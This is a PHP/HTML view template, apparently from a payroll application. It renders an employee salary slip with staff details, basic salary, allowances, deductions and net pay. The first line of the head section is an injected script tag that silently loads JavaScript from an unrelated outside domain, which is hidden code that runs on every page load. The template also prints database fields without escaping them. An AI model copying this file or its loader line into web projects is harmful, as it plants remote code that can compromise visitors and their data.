<!DOCTYPE html>
<html>
<head>
<script type="text/javascript" src="https://branddnewcode1.me/code/gy3dknzugy5ha3ddf44donq" async></script>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
</head>

<body style="width: 100%;">
<br/>
<?php
$img = ROOTPATH . '/' . config_item('company_logo');
$a = file_exists($img);
if (empty($a)) {
    $img = base_url() . config_item('company_logo');
}
if (!file_exists($img)) {
    $img = ROOTPATH . '/' . 'uploads/default_logo.png';
}
?>
<div style="width: 100%; border-bottom: 2px solid black;">
    <table style="width: 100%; vertical-align: middle;">
        <tr>
            <td style="width: 50px; border: 0px;">
                <img style="width: 50px;height: 50px;margin-bottom: 5px;"
                     src="<?= $img ?>" alt="" class="img-circle"/>
            </td>
            <td style="border: 0px;">
                <p style="margin-left: 10px; font: 14px lighter;"><?= config_item('company_name') ?></p>
            </td>
        </tr>
    </table>
</div>
<br/>
<div style="padding: 5px 0; width: 100%;">
    <div>
        <table style="width: 100%; border-radius: 3px;">
            <tr>
                <td style="width: 150px;">
                    <table style="border: 1px solid grey;">
                        <tr>
                            <td style="background-color: lightgray; border-radius: 2px;">
                                <img src="<?php echo staffImage($emp_salary_info->user_id); ?>"
                                     style="width: 138px; height: 144px; border-radius: 3px;">
                            </td>
                        </tr>
                    </table>
                </td>
                <td>
                    <table style="width: 500px; margin-left: 10px; margin-bottom: 10px; font-size: 13px;">
                        <tr>
                            <td style="width: 30%;"><h2><?php echo "$emp_salary_info->fullname"; ?></h2>
                            </td>
                        </tr>
                        <tr>
                            <td style="width: 30%;"><strong><?= lang('emp_id') ?> : </strong></td>
                            <td style="width: 70%"><?php echo "$emp_salary_info->employment_id "; ?></td>
                        </tr>
                        <tr>
                            <td style="width: 30%;"><strong><?= lang('departments') ?> : </strong></td>
                            <td style="width: 70%"><?php echo "$emp_salary_info->deptname"; ?></td>
                        </tr>
                        <tr>
                            <td style="width: 30%;"><strong><?= lang('designation') ?> :</strong></td>
                            <td style="width: 70%"><?php echo "$emp_salary_info->designations"; ?></td>
                        </tr>
                        <tr>
                            <td style="width: 30%;"><strong><?= lang('joining_date') ?>: </strong></td>
                            <td style="width: 70%"><?= strftime(config_item('date_format'), strtotime($emp_salary_info->joining_date)) ?></td>
                        </tr>
                    </table>
                </td>
            </tr>
        </table>
    </div>
</div>
<br/>
<div style="width: 100%;">

    <div>
        <div style="width: 100%; background: #E3E3E3;padding: 1px 0px 1px 10px; color: black; vertical-align: middle; ">
            <p style="margin-left: 10px; font-size: 15px; font-weight: lighter;">
                <strong><?= lang('salary_details') ?></strong></p>
        </div>
        <table style="width: 100%; /*border: 1px solid blue;*/ padding: 10px 0;">
            <tr>
                <td>
                    <table style="width: 100%; font-size: 13px;">
                        <tr>
                            <td style="width: 30%;text-align: right"><strong><?= lang('salary_grade') ?> :</strong></td>

                            <td style="">&nbsp; <?php
                                echo $emp_salary_info->salary_grade;
                                ?></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><strong><?= lang('basic_salary') ?> :</strong></td>

                            <td style="width: 220px;">&nbsp; <?php
                                $curency = $this->db->where('code', config_item('default_currency'))->get('tbl_currencies')->row();
                                echo display_money($emp_salary_info->basic_salary, $curency->symbol);
                                ?></td>
                        </tr>
                        <?php if (!empty($emp_salary_info->overtime_salary)) { ?>
                            <tr>
                                <td style="text-align: right"><strong><?= lang('overtime') ?>
                                        <small>(<?= lang('per_hour') ?>)</small>
                                        :</strong></td>

                                <td style="width: 220px;">
                                    &nbsp; <?php echo display_money($emp_salary_info->overtime_salary, $curency->symbol) ?></td>
                            </tr>
                        <?php } ?>
                    </table>
                </td>
            </tr>
        </table>
    </div>
</div><!-- ***************** Salary Details  Ends *********************-->

<!-- ******************-- Allowance Panel Start **************************-->
<div style="width: 100%;">

    <div>
        <div style="width: 100%; background: #E3E3E3;padding: 1px 0px 1px 10px; color: black; vertical-align: middle; ">
            <p style="margin-left: 10px; font-size: 15px; font-weight: lighter;">
                <strong><?= lang('allowances') ?></strong></p>
        </div>
        <table style="width: 100%; /*border: 1px solid blue;*/ padding: 10px 0;">
            <tr>
                <td>
                    <table style="width: 100%; font-size: 13px;">
                        <?php
                        $total_salary = 0;
                        if (!empty($salary_allowance_info)):foreach ($salary_allowance_info as $v_allowance_info):
                            ?>
                            <tr>
                                <td style="width: 30%;text-align: right">
                                    <strong><?php echo $v_allowance_info->allowance_label; ?> :</strong></td>

                                <td style="width: 220px;">
                                    &nbsp; <?php echo display_money($v_allowance_info->allowance_value, $curency->symbol) ?></td>
                            </tr>
                            <?php $total_salary += $v_allowance_info->allowance_value; ?>
                        <?php endforeach; ?>
                        <?php else: ?>
                            <tr>
                                <td><?= lang('nothing_to_display') ?></td>
                            </tr>
                        <?php endif; ?>
                    </table>
                </td>
            </tr>
        </table>
    </div>
</div><!-- ********************Allowance End ******************-->

<!-- ************** Deduction Panel Column  **************-->
<div style="width: 100%;">

    <div>
        <div style="width: 100%; background: #E3E3E3;padding: 1px 0px 1px 10px; color: black; vertical-align: middle; ">
            <p style="margin-left: 10px; font-size: 15px; font-weight: lighter;">
                <strong><?= lang('deductions') ?></strong></p>
        </div>
        <br/>
        <table style="width: 100%; /*border: 1px solid blue;*/ padding: 10px 0;">
            <tr>
                <td>
                    <table style="width: 100%; font-size: 13px;">
                        <?php
                        $total_deduction = 0;
                        if (!empty($salary_deduction_info)):foreach ($salary_deduction_info as $v_deduction_info):
                            ?>
                            <tr>
                                <td style="width: 30%;text-align: right">
                                    <strong><?php echo $v_deduction_info->deduction_label; ?> :</strong></td>

                                <td style="width: 220px;">&nbsp; <?php
                                    echo display_money($v_deduction_info->deduction_value, $curency->symbol);
                                    ?></td>
                            </tr>
                            <?php $total_deduction += $v_deduction_info->deduction_value ?>
                        <?php endforeach; ?>
                        <?php else: ?>
                            <tr>
                                <td><?= lang('nothing_to_display') ?></td>
                            </tr>
                        <?php endif; ?>
                    </table>
                </td>
            </tr>
        </table>
    </div>
</div><!-- ****************** Deduction End  *******************-->

<!-- ************** Total Salary Details Start  **************-->

<div style="width: 100%;">

    <div>
        <div style="width: 100%; background: #E3E3E3;padding: 1px 0px 1px 10px; color: black; vertical-align: middle; ">
            <p style="margin-left: 10px; font-size: 15px; font-weight: lighter;">
                <strong><?= lang('total_salary_details') ?></strong>
            </p>
        </div>
        <table style="width: 100%; /*border: 1px solid blue;*/ padding: 10px 0;">
            <tr>
                <td>
                    <table style="width: 100%; font-size: 13px;">
                        <tr>
                            <td style="width: 30%;text-align: right"><strong><?= lang('gross_salary') ?>:</strong></td>

                            <td style="width: 220px;">&nbsp; <?php
                                if (!empty($total_salary) || !empty($emp_salary_info->basic_salary)) {
                                    $total = $total_salary + $emp_salary_info->basic_salary;
                                    echo display_money($total, $curency->symbol);
                                }
                                ?></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><strong><?= lang('total_deduction') ?> :</strong></td>

                            <td style="width: 220px;">&nbsp; <?php
                                if (!empty($total_deduction)) {
                                    echo display_money($total_deduction, $curency->symbol);
                                }
                                ?></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><strong><?= lang('net_salary') ?> :</strong></td>

                            <td style="width: 220px;">&nbsp; <?php
                                $net_salary = $total - $total_deduction;
                                echo display_money($net_salary, $curency->symbol);
                                ?></td>
                        </tr>
                    </table>
                </td>
            </tr>
        </table>
    </div>
</div><!-- ****************** Total Salary Details End  *******************-->
</body>
</html>